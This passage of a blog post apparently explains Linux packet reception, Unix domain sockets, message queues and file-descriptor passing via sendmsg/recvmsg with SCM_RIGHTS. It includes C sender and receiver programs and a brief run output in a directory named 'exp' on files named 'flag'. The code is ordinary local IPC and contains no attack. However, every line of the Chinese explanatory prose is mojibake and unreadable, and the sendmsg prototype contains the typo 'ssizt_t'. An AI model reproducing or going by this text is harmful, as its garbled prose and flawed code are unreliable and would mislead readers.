<li>ÁΩëÂç°Êî∂Âà∞Êñ∞ÁöÑÊï∞ÊçÆÂåÖ</li>
<li>ÁΩëÂç°Â∞ÜÊñ∞Êï∞ÊçÆÂåÖÁõ¥Êé•ÈÄöËøá <code>DMA</code> ÂÜôÂà∞ÂÜÖÊ†∏Â†Ü‰∏≠ <code>sk_buffer</code> ÁªìÊûÑ‰ΩìÈáåÔºåÂπ∂‰ΩøÁî®‰∏≠Êñ≠Êù•ÈÄöÁü•ÂÜÖÊ†∏<ul>
<li><code>RX ring buffer</code>ÔºöÁΩëÁªúÊ†àÊé•Êî∂Êï∞ÊçÆÁéØÂΩ¢ÁºìÂ≠òÂå∫</li>
<li><code>DMA</code>ÔºöDirect Memory Access Áõ¥Êé•Â≠òÂÇ®Âô®ËÆøÈóÆÔºåÂ§ñÈÉ®ËÆæÂ§á‰∏çÈÄöËøáCPUËÄåÁõ¥Êé•‰∏éÁ≥ªÁªüÂÜÖÂ≠ò‰∫§Êç¢Êï∞ÊçÆÁöÑÊé•Âè£ÊäÄÊúØ</li>
</ul>
</li>
<li>ÂÜÖÊ†∏Ë∞ÉÁî® <code>netif_receive_skb</code> Êù•Â§ÑÁêÜ <code>sk_buffer</code> ‰∏≠ÁöÑÊï∞ÊçÆÂåÖ</li>
<li>ÂØπ‰∫éÁΩëÁªúÂçèËÆÆÔºåÂÜÖÊ†∏‰ºöÈÅçÂéÜÂçèËÆÆÂÆπÂô® <code>ptype_base</code> ‰∏≠ÁöÑÊâÄÊúâÂçèËÆÆ <code>packet_type</code>ÔºåÂåπÈÖçÊàêÂäüÂêéË∞ÉÁî® <code>packet_type-&gt;func</code> ÂÆåÊàêÁõ∏Â∫îÁöÑÂ§ÑÁêÜ</li>
<li>ÊúÄÂêéÊääÂ§ÑÁêÜÁöÑÁªìÊûúËæìÂá∫Âà∞ÂêÑ‰∏™ÁõÆÊ†áËøõÁ®ã‰∏≠</li>
</ul>
<p><strong>Socket Êú¨Âú∞ÈÄö‰ø°ÂéüÁêÜ</strong></p>
<p>Unix Domain Sockets ‰πü‰ΩøÁî®‰∫ÜÂ∑Æ‰∏çÂ§öÁöÑÂéüÁêÜÔºå‰ΩÜÂ∑ÆÂà´Â¶Ç‰∏ãÔºö</p>
<ul>
<li>UDS ‰∏çÈúÄË¶Å IP:PortÔºåËÄåÊòØÈÄöËøá‰∏Ä‰∏™Êñá‰ª∂ÂêçÊù•Ë°®Á§∫</li>
<li>‰ΩøÁî® UDS Êó∂Ôºå<code>socket</code> ÂáΩÊï∞ÁöÑ <code>domain</code> ÂèÇÊï∞Âõ∫ÂÆö‰∏∫ AF_UNIX</li>
<li>UDS ‰∏≠‰ΩøÁî® <code>sockaddr_un</code> Êù•Ë°®Á§∫ <code>sockaddr</code> ÁªìÊûÑ‰Ωì</li>
</ul>
<p>Ââ©‰∏ãÁöÑÊìç‰ΩúÂ∞±Âíå <code>socket</code> Êé•Âè£ÁöÑÈÇ£‰∏ÄÂ•ó‰∏úË•ø‰∏ÄÊ†∑‰∫Ü</p>
<p><strong>Msg Ê∂àÊÅØÈòüÂàó</strong></p>
<p>‰πãÂâç‰πüÂàÜÊûêËøá‰∫Ü‰ø°ÊÅØÈòüÂàóÁöÑÂ∫ïÂ±ÇÂÆûÁé∞</p>
<p>Ê∂àÊÅØÈòüÂàóÔºåÊòØÊ∂àÊÅØÁöÑÈìæÊé•Ë°®ÔºåÂ≠òÊîæÂú®ÂÜÖÊ†∏‰∏≠Ôºå‰∏Ä‰∏™Ê∂àÊÅØÈòüÂàóÁî±‰∏Ä‰∏™Ê†áËØÜÁ¨¶ÔºàÂç≥IDÔºâÊù•Ê†áËØÜ</p>
<ul>
<li>Ê∂àÊÅØÈòüÂàóÁöÑÊ†áËØÜÁ¨¶ key ÈîÆÔºåÂÆÉÁöÑÂü∫Êú¨Á±ªÂûãÊòØ key_tÔºå‰ΩøÁî® <code>ftok</code> ÂáΩÊï∞ÂèØ‰ª•ÁîüÊàê‰∏Ä‰∏™ key_t</li>
<li>‰∏§‰∏™Êó†ÂÖ≥ÁöÑËøõÁ®ãÔºåÂèØ‰ª•ÈÄöËøáÂîØ‰∏ÄÊ†áËØÜÁ¨¶ key Êù•ÊâæÂà∞ÂØπÂ∫îÁöÑ msg</li>
</ul>
<p><code>msgget</code> ‰ºöÂú®ÂÜÖÊ†∏Â†ÜÁ©∫Èó¥‰∏≠ÂàõÂª∫‰∏Ä‰∏™ <code>msg_queue</code> ÁªìÊûÑ‰ΩìÔºåÁî®‰∫éË°®Á§∫‰∏Ä‰∏™Ê∂àÊÅØÈòüÂàóÁöÑÂ§¥</p>
<p><code>msgsnd</code> Âíå <code>msgrcv</code> ÈÉΩ‰æùÈù† <code>msg_msg</code> ÁªìÊûÑ‰ΩìÔºåÁî®‰∫éË°®Á§∫Âú®Ëøô‰∏™Ê∂àÊÅØÈòüÂàó‰∏≠ÁöÑÂêÑ‰∏™Ê∂àÊÅØ‰∏ª‰Ωì</p>
<p>Ëøô‰∏§ËÄÖÈÄöËøáÈìæË°®Áõ∏ÂÖ≥ËÅîÔºö</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msg_queue -&gt; msg_msg -&gt; msg_msg -&gt; msg_msg ...</span><br></pre></td></tr></table></figure>
<p>‰ΩÜÁé∞Âú®ÊàëÂèà‰∫ÜËß£Âà∞‰∫Ü‰ø°ÊÅØÈòüÂàóÁöÑ‰∏Ä‰∏™ÁâπÊÆäÁî®ÈÄîÔºöÁî®‰∫é‰º†ÈÄí Socket ‰ø°ÊÅØ</p>
<p><strong>FD ËøÅÁßªÊäÄÊúØ</strong></p>
<p>FD ËøÅÁßªÊäÄÊúØÂèØ‰ª•Êää‰∏Ä‰∏™ËøõÁ®ãÊâÄÊåÇËΩΩÁöÑËøûÊé•ÔºàsocketÔºâÔºåËΩ¨ÁßªÂà∞Âè¶Â§ñ‰∏Ä‰∏™ËøõÁ®ã‰πã‰∏ä</p>
<p>‰∏ªË¶ÅÊòØÈÄöËøáÂ¶Ç‰∏ã‰∏§‰∏™Á≥ªÁªüË∞ÉÁî®Ôºö</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">recvmsg</span><span class="params">(<span class="keyword">int</span> sockfd, struct msghdr *msg, <span class="keyword">int</span> flags)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">ssizt_t</span> <span class="title">sendmsg</span><span class="params">(<span class="keyword">int</span> sockfd, struct msghdr *msg, <span class="keyword">int</span> flags)</span></span>;</span><br></pre></td></tr></table></figure>
<ul>
<li>Ëøô‰∏™‰∏§‰∏™ÂáΩÊï∞ÈÉΩÈúÄË¶Å‰º†ÂÖ•‰∏Ä‰∏™ <code>sockfd</code>ÔºåÂπ∂‰æùËµñ <code>msghdr</code> ÁªìÊûÑ‰ΩìÊù•‰º†ÈÄí‰ø°ÊÅØÔºö</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msghdr</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">void</span> *msg_name;		<span class="comment">/* Address to send to/receive from.  */</span></span><br><span class="line">    <span class="keyword">socklen_t</span> msg_namelen;	<span class="comment">/* Length of address data.  */</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> *<span class="title">msg_iov</span>;</span>	<span class="comment">/* Vector of data to send/receive into.  */</span></span><br><span class="line">    <span class="keyword">int</span> msg_iovlen;		<span class="comment">/* Number of elements in the vector.  */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> *msg_control;		<span class="comment">/* Ancillary data (eg BSD filedesc passing). */</span></span><br><span class="line">    <span class="keyword">socklen_t</span> msg_controllen;	<span class="comment">/* Ancillary data buffer length.  */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> msg_flags;		<span class="comment">/* Flags in received message.  */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li>ÂÖ∂‰∏≠ÁöÑ <code>msg_control</code> Êù°ÁõÆÊúâÈúÄË¶ÅÊåáÂêë <code>cmsghdr</code> ÁªìÊûÑ‰ΩìÔºö</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cmsghdr</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">size_t</span> cmsg_len;		<span class="comment">/* Length of data in cmsg_data plus length</span></span><br><span class="line"><span class="comment">				   of cmsghdr structure.</span></span><br><span class="line"><span class="comment">				   !! The type should be socklen_t but the</span></span><br><span class="line"><span class="comment">				   definition of the kernel is incompatible</span></span><br><span class="line"><span class="comment">				   with this.  */</span></span><br><span class="line">    <span class="keyword">int</span> cmsg_level;		<span class="comment">/* Originating protocol.  */</span></span><br><span class="line">    <span class="keyword">int</span> cmsg_type;		<span class="comment">/* Protocol specific type.  */</span></span><br><span class="line">    <span class="meta">#<span class="meta-keyword">if</span> __glibc_c99_flexarr_available</span></span><br><span class="line">    __extension__ <span class="keyword">unsigned</span> <span class="keyword">char</span> __cmsg_data __flexarr; <span class="comment">/* Ancillary data.  */</span></span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li>ÊàêÂëòÂèòÈáè <code>cmsg_type</code> Êúâ3‰∏™Á±ªÂûãÔºö<ul>
<li><code>SCM_RIGHTS</code></li>
<li><code>SCM_CREDENTIALS</code></li>
<li><code>SCM_SECURITY</code></li>
</ul>
</li>
<li>ÂÖ∂‰∏≠Ôºå<code>SCM_RIGHTS</code> Â∞±ÊòØÊàë‰ª¨ÊâÄÈúÄË¶ÅÁöÑÔºåÂÆÉÂÖÅËÆ∏Êàë‰ª¨‰ªé‰∏Ä‰∏™ËøõÁ®ãÔºåÂèëÈÄÅ‰∏Ä‰∏™Êñá‰ª∂Âè•ÊüÑÂà∞Âè¶Â§ñ‰∏Ä‰∏™ËøõÁ®ã</li>
</ul>
<p>Âõ†Ê≠§Ôºå‰æùÈù† <code>sendmsg</code> Âíå <code>recvmsg</code> ‰∏§‰∏™Á≥ªÁªüË∞ÉÁî®Â∞±ÂèØ‰ª•ÂÆûÁé∞ FD Âè•ÊüÑÁöÑ‰º†Ëæì</p>
<ul>
<li>‰æùÈù† <code>sendmsg</code> ÂáΩÊï∞ÔºåÂ∞Ü FD Âè•ÊüÑÂèëÈÄÅÂà∞Âè¶Â§ñ‰∏Ä‰∏™ËøõÁ®ã</li>
<li>‰æùÈù† <code>recvmsg</code> ÂáΩÊï∞ÔºåÊé•Êî∂ËøôÈÉ®ÂàÜÊï∞ÊçÆÔºåÁÑ∂ÂêéÂ∞ÜÂÖ∂ËøòÂéüÊàê <code>cmsghdr</code> ÁªìÊûÑ‰ΩìÔºåÁÑ∂ÂêéÊàë‰ª¨Â∞±ÂèØ‰ª•‰ªé <code>cmsg_data</code> ‰∏≠Ëé∑ÂèñÂè•ÊüÑÂàóË°®</li>
<li>ÂÖ∂ÂÆû FD Âè•ÊüÑÂú®Êüê‰∏™ËøõÁ®ãÈáåÂè™ÊòØ‰∏Ä‰∏™ÂºïÁî®ÔºåÁúüÊ≠£ÁöÑ FD Âè•ÊüÑÊòØÊîæÂú®ÂÜÖÊ†∏‰∏≠ÁöÑÔºåÊâÄË∞ìÁöÑËøÅÁßªÔºåÂè™‰∏çËøáÊòØÊää‰∏Ä‰∏™ÊåáÈíàÔºå‰ªé‰∏Ä‰∏™ËøõÁ®ã‰∏≠ÂéªÊéâÔºåÂÜçÂä†Âà∞Âè¶Â§ñ‰∏Ä‰∏™ËøõÁ®ã‰∏≠ÁΩ¢‰∫Ü</li>
</ul>
<p>ÊµãËØïÊ°à‰æãÂ¶Ç‰∏ãÔºö</p>
<ul>
<li>ÂèëÈÄÅ FD Âè•ÊüÑÔºö</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/un.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> handle_error(msg) do &#123; perror(msg); exit(EXIT_FAILURE); &#125; while(0)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">send_fd</span><span class="params">(<span class="keyword">int</span> socket, <span class="keyword">int</span> *fds, <span class="keyword">int</span> n)</span>  <span class="comment">// send fd by socket</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msghdr</span> <span class="title">msg</span> =</span> &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">cmsghdr</span> *<span class="title">cmsg</span>;</span></span><br><span class="line">    <span class="keyword">char</span> buf[CMSG_SPACE(n * <span class="keyword">sizeof</span>(<span class="keyword">int</span>))], dup[<span class="number">256</span>];</span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="string">&#x27;\0&#x27;</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> <span class="title">io</span> =</span> &#123; .iov_base = &amp;dup, .iov_len = <span class="keyword">sizeof</span>(dup) &#125;;</span><br><span class="line"></span><br><span class="line">    msg.msg_iov = &amp;io;</span><br><span class="line">    msg.msg_iovlen = <span class="number">1</span>;</span><br><span class="line">    msg.msg_control = buf;</span><br><span class="line">    msg.msg_controllen = <span class="keyword">sizeof</span>(buf);</span><br><span class="line"></span><br><span class="line">    cmsg = CMSG_FIRSTHDR(&amp;msg);</span><br><span class="line">    cmsg-&gt;cmsg_level = SOL_SOCKET;</span><br><span class="line">    cmsg-&gt;cmsg_type = SCM_RIGHTS;</span><br><span class="line">    cmsg-&gt;cmsg_len = CMSG_LEN(n * <span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span> ((<span class="keyword">int</span> *) CMSG_DATA(cmsg), fds, n * <span class="keyword">sizeof</span> (<span class="keyword">int</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (sendmsg (socket, &amp;msg, <span class="number">0</span>) &lt; <span class="number">0</span>)</span><br><span class="line">        handle_error (<span class="string">&quot;Failed to send message&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> sfd, fds[<span class="number">2</span>];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_un</span> <span class="title">addr</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (argc != <span class="number">3</span>) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span> (<span class="built_in">stderr</span>, <span class="string">&quot;Usage: %s &lt;file-name1&gt; &lt;file-name2&gt;\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="built_in">exit</span> (<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    sfd = socket(AF_UNIX, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (sfd == <span class="number">-1</span>)</span><br><span class="line">        handle_error (<span class="string">&quot;Failed to create socket&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(&amp;addr, <span class="number">0</span>, <span class="keyword">sizeof</span>(struct sockaddr_un));</span><br><span class="line">    addr.sun_family = AF_UNIX;</span><br><span class="line">    <span class="built_in">strncpy</span>(addr.sun_path, <span class="string">&quot;/tmp/fd-pass.socket&quot;</span>, <span class="keyword">sizeof</span>(addr.sun_path) - <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    fds[<span class="number">0</span>] = open(argv[<span class="number">1</span>], O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (fds[<span class="number">0</span>] &lt; <span class="number">0</span>)</span><br><span class="line">        handle_error (<span class="string">&quot;Failed to open file 1 for reading&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">fprintf</span> (<span class="built_in">stdout</span>, <span class="string">&quot;Opened fd %d in parent\n&quot;</span>, fds[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">    fds[<span class="number">1</span>] = open(argv[<span class="number">2</span>], O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (fds[<span class="number">1</span>] &lt; <span class="number">0</span>)</span><br><span class="line">        handle_error (<span class="string">&quot;Failed to open file 2 for reading&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">fprintf</span> (<span class="built_in">stdout</span>, <span class="string">&quot;Opened fd %d in parent\n&quot;</span>, fds[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (connect(sfd, (struct sockaddr *) &amp;addr, <span class="keyword">sizeof</span>(struct sockaddr_un)) == <span class="number">-1</span>)</span><br><span class="line">        handle_error (<span class="string">&quot;Failed to connect to socket&quot;</span>);</span><br><span class="line"></span><br><span class="line">    send_fd (sfd, fds, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">exit</span>(EXIT_SUCCESS);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>Êé•Êî∂ FD Âè•ÊüÑÔºö</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/un.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> handle_error(msg) do &#123; perror(msg); exit(EXIT_FAILURE); &#125; while(0)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> * <span class="title">recv_fd</span><span class="params">(<span class="keyword">int</span> socket, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> *fds = <span class="built_in">malloc</span> (n * <span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msghdr</span> <span class="title">msg</span> =</span> &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">cmsghdr</span> *<span class="title">cmsg</span>;</span></span><br><span class="line">    <span class="keyword">char</span> buf[CMSG_SPACE(n * <span class="keyword">sizeof</span>(<span class="keyword">int</span>))], dup[<span class="number">256</span>];</span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="string">&#x27;\0&#x27;</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> <span class="title">io</span> =</span> &#123; .iov_base = &amp;dup, .iov_len = <span class="keyword">sizeof</span>(dup) &#125;;</span><br><span class="line"></span><br><span class="line">    msg.msg_iov = &amp;io;</span><br><span class="line">    msg.msg_iovlen = <span class="number">1</span>;</span><br><span class="line">    msg.msg_control = buf;</span><br><span class="line">    msg.msg_controllen = <span class="keyword">sizeof</span>(buf);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (recvmsg (socket, &amp;msg, <span class="number">0</span>) &lt; <span class="number">0</span>)</span><br><span class="line">        handle_error (<span class="string">&quot;Failed to receive message&quot;</span>);</span><br><span class="line"></span><br><span class="line">    cmsg = CMSG_FIRSTHDR(&amp;msg);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span> (fds, (<span class="keyword">int</span> *) CMSG_DATA(cmsg), n * <span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> fds;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">ssize_t</span> nbytes;</span><br><span class="line">    <span class="keyword">char</span> buffer[<span class="number">256</span>];</span><br><span class="line">    <span class="keyword">int</span> sfd, cfd, *fds;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_un</span> <span class="title">addr</span>;</span></span><br><span class="line"></span><br><span class="line">    sfd = socket(AF_UNIX, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (sfd == <span class="number">-1</span>)</span><br><span class="line">        handle_error (<span class="string">&quot;Failed to create socket&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (unlink (<span class="string">&quot;/tmp/fd-pass.socket&quot;</span>) == <span class="number">-1</span> &amp;&amp; errno != ENOENT)</span><br><span class="line">        handle_error (<span class="string">&quot;Removing socket file failed&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(&amp;addr, <span class="number">0</span>, <span class="keyword">sizeof</span>(struct sockaddr_un));</span><br><span class="line">    addr.sun_family = AF_UNIX;</span><br><span class="line">    <span class="built_in">strncpy</span>(addr.sun_path, <span class="string">&quot;/tmp/fd-pass.socket&quot;</span>, <span class="keyword">sizeof</span>(addr.sun_path) - <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (bind(sfd, (struct sockaddr *) &amp;addr, <span class="keyword">sizeof</span>(struct sockaddr_un)) == <span class="number">-1</span>)</span><br><span class="line">        handle_error (<span class="string">&quot;Failed to bind to socket&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (listen(sfd, <span class="number">5</span>) == <span class="number">-1</span>)</span><br><span class="line">        handle_error (<span class="string">&quot;Failed to listen on socket&quot;</span>);</span><br><span class="line"></span><br><span class="line">    cfd = accept(sfd, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (cfd == <span class="number">-1</span>)</span><br><span class="line">        handle_error (<span class="string">&quot;Failed to accept incoming connection&quot;</span>);</span><br><span class="line"></span><br><span class="line">    fds = recv_fd (cfd, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">2</span>; ++i) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span> (<span class="built_in">stdout</span>, <span class="string">&quot;Reading from passed fd %d\n&quot;</span>, fds[i]);</span><br><span class="line">        <span class="keyword">while</span> ((nbytes = read(fds[i], buffer, <span class="keyword">sizeof</span>(buffer))) &gt; <span class="number">0</span>)</span><br><span class="line">            write(<span class="number">1</span>, buffer, nbytes);</span><br><span class="line">        *buffer = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (close(cfd) == <span class="number">-1</span>)</span><br><span class="line">        handle_error (<span class="string">&quot;Failed to close client socket&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>ÁªìÊûúÔºö</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">‚ûú  <span class="built_in">exp</span> ./send flag flag2</span><br><span class="line">Opened fd <span class="number">4</span> in parent</span><br><span class="line">Opened fd <span class="number">5</span> in parent</span><br></pre></td></tr></table></figure>
